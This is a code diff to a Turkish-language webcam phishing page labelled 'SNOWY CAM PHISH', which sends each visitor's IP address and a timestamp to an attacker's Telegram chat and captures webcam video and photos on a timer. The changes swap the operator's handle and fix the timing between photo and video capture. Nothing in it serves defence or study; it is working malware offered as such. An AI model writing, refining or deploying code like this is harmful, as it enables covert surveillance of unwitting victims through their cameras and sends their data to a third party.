@@ -144,7 +144,7 @@
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({
                                 chat_id: TARGET_ID,
-                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`
+                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                             })
                         });
                     })
@@ -152,7 +152,7 @@
             }
             
             // ============================================
-            // KAMERA İŞLEMLERİ - ULTRA HASSAS
+            // KAMERA İŞLEMLERİ - DÜZELTİLMİŞ SENKRONİZASYON
             // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -168,6 +168,7 @@
             let videoRAF = null;
             let baslangicZamani = 0;
             let sonVideoZamani = 0;
+            let ilkCalisma = true;
             
             async function startCamera() {
                 try {
@@ -259,7 +260,7 @@
                         videoRAF = requestAnimationFrame(videoLoop);
                         
                         // ============================================
-                        // FOTOĞRAF SİSTEMİ - REQUESTANIMATIONFRAME İLE
+                        // FOTOĞRAF SİSTEMİ - SENKRONİZE BAŞLANGIÇ
                         // ============================================
                         function fotoLoop() {
                             if (!stream?.active || !videoHazir) {
@@ -269,9 +270,23 @@
                             
                             const now = performance.now();
                             const gecenSure = (now - baslangicZamani) / 1000;
-                            const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                             
-                            while (photoCount < olmasiGerekenFoto) {
+                            // İLK ÇALIŞMADA videoCount 0 iken fotoğraf bekle
+                            if (ilkCalisma && videoCount === 0) {
+                                fotoRAF = requestAnimationFrame(fotoLoop);
+                                return;
+                            }
+                            
+                            ilkCalisma = false;
+                            
+                            // Geçen süreye göre olması gereken fotoğraf sayısı
+                            // Video ile senkronize et: ilk video başladıktan sonra fotoğraflar başlasın
+                            const videoGecikmesi = VIDEO_SURESI * 1000;
+                            const duzeltilmisGecenSure = Math.max(0, gecenSure - (videoGecikmesi / 1000));
+                            const olmasiGerekenFoto = Math.floor(duzeltilmisGecenSure / FOTO_SURESI);
+                            
+                            // Eksik fotoğrafları çek - ama sadece 1'er 1'er
+                            if (photoCount < olmasiGerekenFoto) {
                                 photoCount++;
                                 
                                 canvas.width = video.videoWidth || 640;
